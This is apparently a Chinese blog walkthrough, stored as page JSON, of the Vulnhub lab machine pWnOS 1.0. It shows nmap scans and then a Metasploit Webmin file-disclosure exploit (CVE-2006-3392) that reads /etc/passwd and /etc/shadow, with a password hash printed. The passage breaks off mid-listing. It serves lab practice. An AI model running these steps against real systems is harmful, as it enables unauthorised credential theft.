{"pageProps":{"postData":{"id":"VulnhubpWnOS 1 0","contentHtml":"<h1>pWnOS: 1.0</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/pwnos-10,33/\">https://www.vulnhub.com/entry/pwnos-10,33/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>152</code>为靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>           \n<span class=\"hljs-comment\">//      </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 10:28 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00023</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00025</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.152</span> <span class=\"hljs-comment\">//靶机</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00072</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>E:<span class=\"hljs-number\">18</span>:<span class=\"hljs-title function_ invoke__\">C9</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00012</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机所有端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.152</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 10:29 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.152</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0023</span>s latency).\nNot shown: <span class=\"hljs-number\">65530</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp    open  ssh\n<span class=\"hljs-number\">80</span>/tcp    open  http\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">10000</span>/tcp open  snet-sensor-mgmt\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>E:<span class=\"hljs-number\">18</span>:<span class=\"hljs-title function_ invoke__\">C9</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">10000</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.152</span>   \n<span class=\"hljs-comment\">//        </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-25 10:30 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.152</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00044</span>s latency).\n\nPORT      STATE SERVICE     VERSION\n<span class=\"hljs-number\">22</span>/tcp    open  ssh         OpenSSH <span class=\"hljs-number\">4.6</span>p1 Debian <span class=\"hljs-number\">5</span>build1 (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp    open  http        Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">4</span> ((Ubuntu) PHP/<span class=\"hljs-number\">5.2</span>.<span class=\"hljs-number\">3</span>-<span class=\"hljs-number\">1</span>ubuntu6)\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn Samba smbd <span class=\"hljs-number\">3</span>.X - <span class=\"hljs-number\">4</span>.<span class=\"hljs-title function_ invoke__\">X</span> (<span class=\"hljs-attr\">workgroup</span>: MSHOME)\n<span class=\"hljs-number\">445</span>/tcp   open  netbios-ssn Samba smbd <span class=\"hljs-number\">3</span>.X - <span class=\"hljs-number\">4</span>.<span class=\"hljs-title function_ invoke__\">X</span> (<span class=\"hljs-attr\">workgroup</span>: MSHOME)\n<span class=\"hljs-number\">10000</span>/tcp open  http        MiniServ <span class=\"hljs-number\">0.01</span> (Webmin httpd)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>E:<span class=\"hljs-number\">18</span>:<span class=\"hljs-title function_ invoke__\">C9</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">22</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">22</span> (embedded, ARM), Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">22</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">23</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">10000</span>  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">+</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-25</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">31</span> CST\nStats: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">48</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan\nNSE Timing: About <span class=\"hljs-number\">99.36</span><span class=\"hljs-operator\">%</span> done; ETC: <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">36</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span> remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00050</span>s latency).\n\nPORT      STATE SERVICE\n<span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span>tcp    <span class=\"hljs-keyword\">open</span>  ssh\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp    <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n| http-enum: \n|   /icons/: Potentially interesting directory w/ listing on '</span>apache<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.4</span> (ubuntu) php<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">5.2</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">-1</span>ubuntu6<span class=\"hljs-string\">'\n|   /index/: Potentially interesting folder\n|_  /php/: Potentially interesting directory w/ listing on '</span>apache<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.4</span> (ubuntu) php<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">5.2</span><span class=\"hljs-number\">.3</span><span class=\"hljs-number\">-1</span>ubuntu6<span class=\"hljs-string\">'\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-keyword\">any</span> DOM based XSS.\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>slowloris<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">check</span>: \n<span class=\"hljs-operator\">|</span>   VULNERABLE:\n<span class=\"hljs-operator\">|</span>   Slowloris DOS attack\n<span class=\"hljs-operator\">|</span>     State: LIKELY VULNERABLE\n<span class=\"hljs-operator\">|</span>     IDs:  CVE:CVE<span class=\"hljs-number\">-2007</span><span class=\"hljs-number\">-6750</span>\n<span class=\"hljs-operator\">|</span>       Slowloris tries <span class=\"hljs-keyword\">to</span> keep many connections <span class=\"hljs-keyword\">to</span> the target web server <span class=\"hljs-keyword\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">hold</span>\n<span class=\"hljs-operator\">|</span>       them <span class=\"hljs-keyword\">open</span> <span class=\"hljs-keyword\">as</span> long <span class=\"hljs-keyword\">as</span> possible.  It accomplishes this <span class=\"hljs-keyword\">by</span> opening connections <span class=\"hljs-keyword\">to</span>\n<span class=\"hljs-operator\">|</span>       the target web server <span class=\"hljs-keyword\">and</span> sending a partial request. <span class=\"hljs-keyword\">By</span> doing so, it starves\n<span class=\"hljs-operator\">|</span>       the http server<span class=\"hljs-string\">'s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-trace: TRACE is enabled\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-keyword\">any</span> stored XSS vulnerabilities.\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>cve2017<span class=\"hljs-number\">-1001000</span>: ERROR: Script execution failed (use <span class=\"hljs-operator\">-</span>d <span class=\"hljs-keyword\">to</span> debug)\n<span class=\"hljs-number\">139</span><span class=\"hljs-operator\">/</span>tcp   <span class=\"hljs-keyword\">open</span>  netbios<span class=\"hljs-operator\">-</span>ssn\n<span class=\"hljs-number\">445</span><span class=\"hljs-operator\">/</span>tcp   <span class=\"hljs-keyword\">open</span>  microsoft<span class=\"hljs-operator\">-</span>ds\n<span class=\"hljs-number\">10000</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  snet<span class=\"hljs-operator\">-</span>sensor<span class=\"hljs-operator\">-</span>mgmt\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>cve2006<span class=\"hljs-number\">-3392</span>: \n<span class=\"hljs-operator\">|</span>   VULNERABLE:\n<span class=\"hljs-operator\">|</span>   Webmin File Disclosure\n<span class=\"hljs-operator\">|</span>     State: VULNERABLE (Exploitable)\n<span class=\"hljs-operator\">|</span>     IDs:  CVE:CVE<span class=\"hljs-number\">-2006</span><span class=\"hljs-number\">-3392</span>\n<span class=\"hljs-operator\">|</span>       Webmin before <span class=\"hljs-number\">1.290</span> <span class=\"hljs-keyword\">and</span> Usermin before <span class=\"hljs-number\">1.220</span> calls the simplify_path <span class=\"hljs-keyword\">function</span> before decoding HTML.\n<span class=\"hljs-operator\">|</span>       This allows arbitrary files <span class=\"hljs-keyword\">to</span> be read, <span class=\"hljs-keyword\">without</span> requiring authentication, <span class=\"hljs-keyword\">using</span> \"..%01\" sequences\n<span class=\"hljs-operator\">|</span>       <span class=\"hljs-keyword\">to</span> bypass the removal <span class=\"hljs-keyword\">of</span> \"../\" directory traversal sequences.\n<span class=\"hljs-operator\">|</span>       \n<span class=\"hljs-operator\">|</span>     Disclosure <span class=\"hljs-type\">date</span>: <span class=\"hljs-number\">2006</span><span class=\"hljs-number\">-06</span><span class=\"hljs-number\">-29</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-keyword\">References</span>:\n<span class=\"hljs-operator\">|</span>       https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>cve.mitre.org<span class=\"hljs-operator\">/</span>cgi<span class=\"hljs-operator\">-</span>bin<span class=\"hljs-operator\">/</span>cvename.cgi?name<span class=\"hljs-operator\">=</span>CVE<span class=\"hljs-number\">-2006</span><span class=\"hljs-number\">-3392</span>\n<span class=\"hljs-operator\">|</span>       http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.exploit<span class=\"hljs-operator\">-</span>db.com<span class=\"hljs-operator\">/</span>exploits<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1997</span><span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">|</span>_      http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>www.rapid7.com<span class=\"hljs-operator\">/</span>db<span class=\"hljs-operator\">/</span>modules<span class=\"hljs-operator\">/</span>auxiliary<span class=\"hljs-operator\">/</span>admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>E:<span class=\"hljs-number\">18</span>:C9 (VMware)\n\nHost script results:\n<span class=\"hljs-operator\">|</span>_smb<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>ms10<span class=\"hljs-number\">-054</span>: <span class=\"hljs-literal\">false</span>\n<span class=\"hljs-operator\">|</span>_smb<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>regsvc<span class=\"hljs-operator\">-</span>dos: ERROR: Script execution failed (use <span class=\"hljs-operator\">-</span>d <span class=\"hljs-keyword\">to</span> debug)\n<span class=\"hljs-operator\">|</span>_smb<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>ms10<span class=\"hljs-number\">-061</span>: <span class=\"hljs-literal\">false</span>\n\n</code></pre>\n<p>扫描出<code>miniserv</code>迷你服务器搭建的<code>webmin</code>，并且扫出它的任意文件读取漏洞<code>cve2006-3392</code> ，还有一些会令人感兴趣的文件</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<p>因为扫描出了任意文件读取漏洞，就从漏洞开始入手</p>\n<ol>\n<li>\n<p>使用<code>msf</code>利用漏洞，读取 <code>/etc/pass</code> 和 <code>/etc/shadows</code></p>\n<pre><code class=\"hljs language-sql\">msf6 <span class=\"hljs-operator\">></span> use auxiliary<span class=\"hljs-operator\">/</span>admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure \nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">show</span> options <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 查看需要配置的\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.152</span>\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rpath <span class=\"hljs-operator\">/</span>etc<span class=\"hljs-operator\">/</span>passwd <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>读取<span class=\"hljs-operator\">/</span>etc<span class=\"hljs-operator\">/</span>pass\nmsf6 auxiliary(admin<span class=\"hljs-operator\">/</span>webmin<span class=\"hljs-operator\">/</span>file_disclosure) <span class=\"hljs-operator\">></span> exploit\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>读取到\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:<span class=\"hljs-operator\">/</span>root:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:<span class=\"hljs-operator\">/</span>dev:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>games:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>cache<span class=\"hljs-operator\">/</span>man:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>lpd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>mail:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>news:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>uucp:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nwww<span class=\"hljs-operator\">-</span>data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www<span class=\"hljs-operator\">-</span>data:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>backups:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlist:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>list:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>ircd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug<span class=\"hljs-operator\">-</span>Reporting <span class=\"hljs-keyword\">System</span> (admin):<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>gnats:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:<span class=\"hljs-operator\">/</span>nonexistent:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\ndhcp:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">101</span>::<span class=\"hljs-operator\">/</span>nonexistent:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nsyslog:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">102</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>syslog:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nklog:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">103</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>klog:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nmysql:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">107</span>:MySQL Server,,,:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>mysql:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nsshd:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">65534</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>sshd:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>nologin\nvmware:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:vmware,,,:<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>vmware:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nobama:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>obama:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nosama:x:<span class=\"hljs-number\">1002</span>:<span class=\"hljs-number\">1002</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>osama:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nyomama:x:<span class=\"hljs-number\">1003</span>:<span class=\"hljs-number\">1003</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>yomama:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\n</code></pre>\n<p>把<code>path</code>设置为<code>/etc/shadow</code> 读取</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>etc<span class=\"hljs-operator\">/</span>shadow\nroot:$<span class=\"hljs-number\">1</span>$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm<span class=\"hljs-operator\">/</span>:<span class=\"hljs-number\">14041</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ndaemon:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbin:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsys:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsync:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngames:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nman:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlp:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmail:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnews:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nuucp:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nproxy:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwww<span class=\"hljs-operator\">-</span>data:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbackup:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlist:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nirc:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngnats:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnobody:<span class=\"hljs-operator\">*</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ndhcp:<span class=\"hljs-operator\">!</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsyslog:<span class=\"hljs-operator\">!</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nklog:<span class=\"hljs-operator\">!</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmysql:<span class=\"hljs-operator\">!</span>:<span class=\"hljs-number\">14040</span>:<span class=\"hljs-number\">0</span>:<span 